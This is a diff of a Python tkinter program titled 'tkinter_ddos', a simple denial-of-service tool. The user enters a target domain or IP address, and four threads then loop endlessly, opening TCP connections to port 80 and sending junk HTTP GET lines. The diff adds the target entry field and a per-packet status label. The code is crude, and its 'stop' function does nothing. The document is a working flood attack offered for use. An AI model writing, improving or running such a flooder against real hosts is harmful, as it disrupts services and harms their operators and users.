@@ -1,29 +1,44 @@
 import socket
 from threading import Thread
 from tkinter import *
-host = "" #input("Enter a host: ")
-target = host #socket.gethostbyname(host)
-port = 80
+def form():
+    host = input_host.get()
+    global target
+    target = socket.gethostbyname(host)
+    global port
+    port = 80
+    #print(target, port)
 def ddos():
     while True:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
             try:
                 mysocket.connect((target, port))
                 #random scheiß daten
-                mysocket.send(str.encode("GET " + "button" + "HTTP/1.1 \r\n"))
-                mysocket.sendto(str.encode("GET " + "button" + "HTTP/1.1 \r\n"), (target, port))
+                mysocket.send(str.encode("GET " + "lul" + "HTTP/1.1 \r\n"))
+                mysocket.sendto(str.encode("GET " + "lul" + "HTTP/1.1 \r\n"), (target, port))
+                label = Label(window, text="send package")
+                label.pack()
             except socket.error:
-                print("error")
+                print("Server down time.")
         mysocket.close()
 def start():
     for i in range(4):
         t = Thread(target=ddos)
         t.start()
+def stop():
+    for i in range(4):
+        t = Thread(target=ddos)
+        break
 window = Tk()
 window.title("tkinter_ddos")
 window.minsize(width=400, height=300)
-dos_button = Button(window, text="DDOS", command=start)
-kill_button = Button(window, text="kill", command=quit)
-dos_button.pack()
-kill_button.pack()
+lable = Label(window, text="Target domian/ipv4.")
+input_host = Entry(window)
+dos_start_button = Button(window, text="start()", command=start)
+input_button = Button(window, text="submit", command=form)
+lable.pack()
+input_host.pack()
+input_button.pack()
+input_host.pack()
+dos_start_button.pack()
 window.mainloop()
